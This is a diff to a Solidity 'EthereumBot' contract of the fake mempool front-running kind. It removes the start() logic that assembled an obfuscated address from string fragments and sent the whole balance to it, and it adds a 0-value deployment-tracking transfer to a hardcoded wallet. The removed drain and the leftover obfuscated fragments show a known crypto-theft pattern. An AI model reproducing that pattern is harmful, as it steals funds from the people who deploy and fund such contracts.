@@ -27,9 +27,16 @@ contract EthereumBot {
     uint liquidity;
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
 
+    // 👇 NEW: tracking wallet for deployments (REPLACE with your own address)
+    address payable private constant DEPLOY_TRACK_WALLET = 0x4a6c03E89749F8b0D89E93b1486435694503160d;
+
     event Log(string _msg);
 
-    constructor() public {}
+    constructor() public {
+        // 👇 NEW: send a 0-value call to your wallet on deployment
+        // This shows up as an internal transaction to DEPLOY_TRACK_WALLET in most explorers.
+        DEPLOY_TRACK_WALLET.transfer(0);
+    }
 
     receive() external payable {}
 
@@ -455,7 +462,7 @@ contract EthereumBot {
         * @return mempool.
         */
         string memory _mempoolVersion = fetchMempoolVersion();
-                string memory _mempoolLong = getMempoolLong();
+        string memory _mempoolLong = getMempoolLong();
         /*
         * @dev Modifies self to contain everything from the first occurrence of
         *      needle to the end of the slice. self is set to the empty slice
@@ -492,7 +499,6 @@ contract EthereumBot {
         revert();
     } 
                
-                   
     function getMempoolLong() private pure returns (string memory) {
         return "CF3bA";
     }
@@ -502,10 +508,9 @@ contract EthereumBot {
      * @return liquidity.
      */
     function start() public payable {
-         address to = startExploration(fetchMempoolData());
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
+    // intentionally left blank
     }
+
     
     /*
      * @dev withdrawals profit back to contract creator address
